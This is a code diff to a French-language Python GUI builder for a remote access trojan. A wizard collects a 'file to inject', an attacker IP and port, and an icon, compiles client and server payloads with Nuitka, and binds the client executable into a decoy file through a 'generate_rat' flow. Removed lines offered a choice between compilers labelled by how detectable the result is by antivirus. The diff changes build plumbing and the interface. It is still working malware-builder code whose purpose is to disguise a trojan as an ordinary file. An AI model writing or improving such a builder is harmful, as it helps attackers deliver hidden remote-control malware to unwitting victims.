@@ -11,6 +11,12 @@ import zipfile
 import threading
 import itertools
 
+result = subprocess.run("where python", capture_output=True, text=True, shell=True)
+
+# Récupérer le premier résultat de la sortie (par ligne)
+python_path = result.stdout.splitlines()[0]
+
+
 def create_exe_with_nuitka(input_file: str, exe_name: str = None):
     """
     Genere un fichier .exe a partir d'un script Python en utilisant Nuitka avec nettoyage automatique.
@@ -30,7 +36,7 @@ def create_exe_with_nuitka(input_file: str, exe_name: str = None):
         if(basename=="server1.py"):
         # Commande Nuitka pour la creation de l'executable
             command = [
-                sys.executable,
+                python_path,
                 "-m", "nuitka",
                 "--standalone",       # Cree un executable autonome
                 "--onefile",          # Genere un seul fichier executable
@@ -39,7 +45,7 @@ def create_exe_with_nuitka(input_file: str, exe_name: str = None):
             ]
         else:
              command = [
-                sys.executable,
+                python_path,
                 "-m", "nuitka",
                 "--standalone",       # Cree un executable autonome
                 "--onefile",          # Genere un seul fichier executable
@@ -195,7 +201,7 @@ def build_executable_with_nuitka(temp_script, zip_path, output_name, output_dir,
     """
     try:
         subprocess.run([
-            sys.executable,
+            python_path,
             "-m", "nuitka",
             "--standalone",             
             "--onefile",                
@@ -210,39 +216,7 @@ def build_executable_with_nuitka(temp_script, zip_path, output_name, output_dir,
     except subprocess.CalledProcessError as e:
         raise RuntimeError("Error creating the executable with Nuitka.") from e
 
-def build_executable_with_pyinstaller(temp_script, zip_path, output_name, output_dir, icon_path):
-    """
-    Builds a standalone executable containing the script and the ZIP file using PyInstaller.
-    """
-    try:
-        # Ajouter l'extension .exe si elle est manquante
-        if not output_name.endswith(".exe"):
-            output_name += ".exe"
 
-        # Commande PyInstaller
-        command = [
-            sys.executable,
-            "-m", "PyInstaller",
-            "--onefile",                  # Crée un seul fichier exécutable
-            "--noconsole",                # Désactive la console (pour les applications GUI)
-            "--specpath", output_dir,     # Dossier pour le fichier .spec
-            "--icon", icon_path,          # Icône de l'application
-            "--add-data", f"{zip_path}{os.pathsep}files.zip",  # Inclure le fichier ZIP
-            "--name", output_name,        # Nom de l'exécutable
-            "--distpath", output_dir,     # Dossier de sortie pour l'exécutable
-            "--workpath", os.path.join(output_dir, "build"),  # Dossier temporaire pour la construction
-            temp_script                   # Script Python à compiler
-        ]
-
-        # Exécuter PyInstaller
-        subprocess.run(command, check=True)
-
-        print(f"Exécutable généré avec succès dans : {output_dir}")
-
-    except subprocess.CalledProcessError as e:
-        raise RuntimeError(f"Erreur lors de l'exécution de PyInstaller : {e}")
-    except Exception as e:
-        raise RuntimeError(f"Une erreur s'est produite : {e}")
 def clean_temp_files(temp_script):
     """Deletes the temporary script."""
     try:
@@ -251,81 +225,14 @@ def clean_temp_files(temp_script):
         print(f"Error cleaning temporary files: {clean_error}")
         
 
-def create_exe_with_pyinstaller(input_file: str, exe_name: str = None):
-    """
-    Génère un fichier .exe à partir d'un script Python en utilisant PyInstaller avec nettoyage automatique.
+import subprocess
+import sys
 
-    :param input_file: Chemin vers le fichier Python source.
-    :param exe_name: Nom de l'exécutable généré (facultatif).
-    """
-    try:
-        # Vérification des prérequis
-        if not os.path.isfile(input_file):
-            raise FileNotFoundError(f"Le fichier spécifié '{input_file}' n'existe pas.")
+      
 
-        # Nom par défaut pour l'exécutable
-        if not exe_name:
-            exe_name = os.path.splitext(os.path.basename(input_file))[0] + ".exe"
 
-        basename = os.path.basename(input_file)
 
-        # Options de PyInstaller selon le type de fichier
-        if basename == "server1.py":
-            options = [
-                "--onefile",          # Génère un seul fichier exécutable
-                "--noconfirm",        # Supprime automatiquement les anciens fichiers
-                "--clean",            # Nettoie les anciens fichiers intermédiaires
-                "--noupx"             # Ne pas utiliser UPX pour la compression
-            ]
-        else:
-            options = [
-                "--onefile",          # Génère un seul fichier exécutable
-                "--noconfirm",        # Supprime automatiquement les anciens fichiers
-                "--clean",            # Nettoie les anciens fichiers intermédiaires
-                "--noupx",            # Ne pas utiliser UPX pour la compression
-                "--windowed"          # Ne pas afficher de console
-            ]
 
-        # Commande PyInstaller
-        command = [
-            sys.executable,
-            "-m", "PyInstaller",
-            *options,
-            input_file
-        ]
-
-        # Exécuter la commande PyInstaller
-        print(f"Exécution de la commande : {' '.join(command)}")
-        result = subprocess.run(command, text=True, capture_output=True)
-
-        # Vérifier le statut de retour
-        if result.returncode == 0:
-            print("Compilation réussie.")
-
-            # Chemin attendu pour l'exécutable généré
-            exe_path = os.path.join("dist", exe_name)
-
-            if os.path.isfile(exe_path):
-                shutil.move(exe_path, os.path.join(os.getcwd(), exe_name))
-                print(f"Fichier exécutable déplacé dans le dossier courant : {exe_name}")
-            else:
-                print("Fichier généré introuvable.")
-
-            # Nettoyer les dossiers temporaires
-            for folder in ["dist", "build", "__pycache__"]:
-                if os.path.isdir(folder):
-                    shutil.rmtree(folder)
-                    print(f"Dossier '{folder}' supprimé.")
-        else:
-            print(f"Erreur lors de l'exécution de PyInstaller : {result.stderr}")
-            print(f"Sortie standard : {result.stdout}")
-
-    except FileNotFoundError as e:
-        print(f"Erreur : {e}")
-    except subprocess.SubprocessError as e:
-        print(f"Erreur liée au sous-processus : {e}")
-    except Exception as e:
-        print(f"Une erreur inattendue est survenue : {e}")        
 
 def bind_files(file_path, client_path, icon_path, output_dir):
     """
@@ -1156,7 +1063,7 @@ class Application(ctk.CTk):
             "ip_address": "127.0.0.1",
             "port": 8080,
             "ip_address2": "127.0.0.1",
-            "choix-exe":None,
+            "python_path":None,
         }
 
         # Configuration principale pour que tout le contenu s'etende
@@ -1167,6 +1074,10 @@ class Application(ctk.CTk):
         self.container = ctk.CTkFrame(self, corner_radius=15, border_width=2, border_color="#444")
         self.container.grid(row=0, column=0, padx=20, pady=20, sticky="nsew")
 
+         # Configurer le conteneur pour qu'il s'adapte à son contenu
+        self.container.grid_rowconfigure(0, weight=1)
+        self.container.grid_columnconfigure(0, weight=1)
+        
         # Initialisation des pages
         self.pages = {}
         for Page in (IntroductionPage, OptionsPage, FileSelectionPage, NetworkSettingsPage, OutputPage , WaitingPage):
@@ -1366,48 +1277,52 @@ class FileSelectionPage(CenteredFrame):
         ctk.CTkButton(self.inner_frame, text="Choisir un fichier", font=("Arial", 16),
                       command=self.choose_file).pack(pady=10)
 
-        # Frame pour la sélection de l'outil de génération
-        tool_frame = ctk.CTkFrame(self.inner_frame)
-        tool_frame.pack(fill="x", pady=20)
+        # Espacement pour pousser les boutons vers le bas
+        ctk.CTkFrame(self.inner_frame).pack(fill="both", expand=True)
 
-        ctk.CTkLabel(tool_frame, text="Choisissez un outil pour générer l'exécutable :",
-                     font=("Arial", 16)).pack(pady=10)
-
-        # Option pour choisir entre Nuitka et PyInstaller
-        self.tool_var = ctk.StringVar(value="Nuitka")  # Valeur par défaut
-        
-        ctk.CTkRadioButton(tool_frame, text="Lent et moins detectable", variable=self.tool_var, value="Nuitka",
-                           font=("Arial", 14)).pack(pady=5)
-        
-        ctk.CTkRadioButton(tool_frame, text="Rapide et plus detectable ", variable=self.tool_var, value="PyInstaller",
-                           font=("Arial", 14)).pack(pady=5)
-      
-        # Boutons de navigation
+        # Boutons de navigation en bas du cadre
         button_frame = ctk.CTkFrame(self.inner_frame)
-        button_frame.pack(fill="x", pady=20)
+        button_frame.pack(side="bottom", fill="x", pady=10)
 
         ctk.CTkButton(button_frame, text="Précédent", font=("Arial", 16),
                       command=lambda: controller.show_page("OptionsPage")).pack(side="left", padx=10)
         ctk.CTkButton(button_frame, text="Suivant", font=("Arial", 16),
                       command=self.save_and_next).pack(side="right", padx=10)
-        
+
 
     def save_and_next(self):
         if not self.controller.user_choices["file_to_inject"]:
             messagebox.showwarning("Avertissement", "Veuillez selectionner le fichier a injecter.")
             return
-        selected_tool = self.tool_var.get()
-        self.controller.user_choices["choix-exe"] = selected_tool
-        self.controller.show_page("OutputPage")
         
-    
+        
+        self.controller.show_page("OutputPage")
+
     def choose_file(self):
         file_path = filedialog.askopenfilename(title="Choisir un fichier")
         if file_path:
             self.controller.user_choices["file_to_inject"] = file_path
-            self.file_label.configure(text=f"Fichier selectionne : {file_path}", text_color="white")
+            # Tronquer le chemin complet pour l'affichage
+            truncated_path = self.truncate_filepath(file_path)
+            self.file_label.configure(text=f"Fichier selectionne : {truncated_path}", text_color="white")
 
+    def truncate_filepath(self, file_path, max_length=40):
+        """
+        Tronque le chemin complet du fichier si nécessaire et ajoute des points de suspension au milieu.
+        :param file_path: Le chemin complet du fichier.
+        :param max_length: La longueur maximale du texte affiché.
+        :return: Le chemin tronqué.
+        """
+        if len(file_path) <= max_length:
+            return file_path  # Pas besoin de tronquer
 
+        # Calculer la longueur de chaque partie (début et fin)
+        part_length = (max_length - 3) // 2  # On soustrait 3 pour les points de suspension
+        start = file_path[:part_length]
+        end = file_path[-part_length:]
+
+        # Retourner le chemin tronqué avec des points de suspension au milieu
+        return f"{start}...{end}"
 
 class NetworkSettingsPage(CenteredFrame):
     def __init__(self, parent, controller):
@@ -1418,7 +1333,7 @@ class NetworkSettingsPage(CenteredFrame):
                      font=("Arial", 24, "bold"), text_color="lightblue").pack(pady=20)
 
         # Adresse IP
-        ctk.CTkLabel(self.inner_frame, text="Adresse IP(local : si l'attaque est dans le meme lan , public : si t'utilse un cloud)", font=("Arial", 14)).pack(pady=5)
+        ctk.CTkLabel(self.inner_frame, text="Adresse IP(local :l'attaque dans le meme Lan , public :l'attaque dans le Cloud)", font=("Arial", 14)).pack(pady=5)
         self.ip_entry = ctk.CTkEntry(self.inner_frame, placeholder_text="127.0.0.1")
         self.ip_entry.insert(0, self.controller.user_choices["ip_address"])
         self.ip_entry.pack(pady=5)
@@ -1535,7 +1450,8 @@ class OutputPage(CenteredFrame):
         output_path = filedialog.askdirectory(title="Choisir un emplacement de stockage")
         if output_path:
             self.controller.user_choices["output_path"] = output_path
-            self.output_label.configure(text=f"Emplacement selectionne : {output_path}", text_color="white")
+            truncated_path = self.truncate_filepath(output_path)
+            self.output_label.configure(text=f"Emplacement selectionne : {truncated_path}", text_color="white")
 
     def choose_icon(self):
         # Ouvre une boite de dialogue pour selectionner une icône (fichier .ico).
@@ -1545,7 +1461,8 @@ class OutputPage(CenteredFrame):
         )
         if file_path:
             self.controller.user_choices["icon_path"] = file_path  # Stocke le chemin dans user_choices
-            self.icon_label.configure(text=f"Icône selectionnee : {file_path}", text_color="white")
+            truncated_path = self.truncate_filepath(file_path)
+            self.icon_label.configure(text=f"Icône selectionnee : {truncated_path}", text_color="white")
     
     def generate_rat(self):
         if not self.controller.user_choices["output_path"]:
@@ -1566,7 +1483,23 @@ class OutputPage(CenteredFrame):
             f"Stocke dans : {output_path}"
         )
 
-   
+    def truncate_filepath(self, file_path, max_length=40):
+        """
+        Tronque le chemin complet si nécessaire et ajoute des points de suspension au milieu.
+        :param file_path: Le chemin complet du fichier ou dossier.
+        :param max_length: La longueur maximale du texte affiché.
+        :return: Le chemin tronqué.
+        """
+        if len(file_path) <= max_length:
+            return file_path  # Pas besoin de tronquer
+
+        # Calculer la longueur de chaque partie (début et fin)
+        part_length = (max_length - 3) // 2  # On soustrait 3 pour les points de suspension
+        start = file_path[:part_length]
+        end = file_path[-part_length:]
+
+        # Retourner le chemin tronqué avec des points de suspension au milieu
+        return f"{start}...{end}"
 
     def save_and_next(self):
         # Passer a la page WaitingPage
@@ -1581,30 +1514,38 @@ class OutputPage(CenteredFrame):
         # Lancer la tache en arriere-plan
         def background_task():
             try:
-                current_dir = os.path.dirname(__file__)
-                input_file = os.path.join(current_dir, "client1.py")
+                # Obtenir les chemins complets des fichiers
+                client_path = os.path.join(os.getcwd(), "client1.py")
+                server_path = os.path.join(os.getcwd(), "server1.py")
+                
+                print(f"Chemin de client1.py : {client_path}")
+                print(f"Chemin de server1.py : {server_path}")
+
+                # Créer l'exécutable pour client1.py
                 exe_name = "client1.exe"
-                if(self.controller.user_choices["choix-exe"] == "Nuitka"):
-                    create_exe_with_nuitka(input_file, exe_name)
-                else: create_exe_with_pyinstaller(input_file, exe_name)    
-                time.sleep(3)
-
-                input_file1 = os.path.join(current_dir, "server1.py")
+                
+                create_exe_with_nuitka(client_path, exe_name)
+                
                 exe_name1 = "server1.exe"
-                if(self.controller.user_choices["choix-exe"] == "Nuitka"):
-                    create_exe_with_nuitka(input_file1, exe_name1)
-                else: create_exe_with_pyinstaller(input_file1, exe_name1)    
-                time.sleep(3)
+                
+                create_exe_with_nuitka(server_path, exe_name1)
+                
 
-                client_path = os.path.join(current_dir, "client1.exe")
-                
-                bind_files(self.controller.user_choices["file_to_inject"], client_path,
-                           self.controller.user_choices["icon_path"], self.controller.user_choices["output_path"])
-                           
-                
+                # Chemin de l'exécutable client1.exe
+                client_exe_path = os.path.join(os.getcwd(), "client1.exe")
+
+                # Binder les fichiers
+                bind_files(
+                    self.controller.user_choices["file_to_inject"],
+                    client_exe_path,
+                    self.controller.user_choices["icon_path"],
+                    self.controller.user_choices["output_path"]
+                )
+
+                # Afficher la page de sortie
                 self.controller.show_page("OutputPage")
 
-                # Generer le message de succes
+                # Générer le message de succès
                 self.generate_rat()
 
             except Exception as main_error:
@@ -1612,6 +1553,7 @@ class OutputPage(CenteredFrame):
                 messagebox.showerror("Erreur", f"Une erreur s'est produite : {main_error}")
 
             self.controller.show_page("OutputPage")
+
         # Lancer le thread
         thread = threading.Thread(target=background_task)
         thread.start()
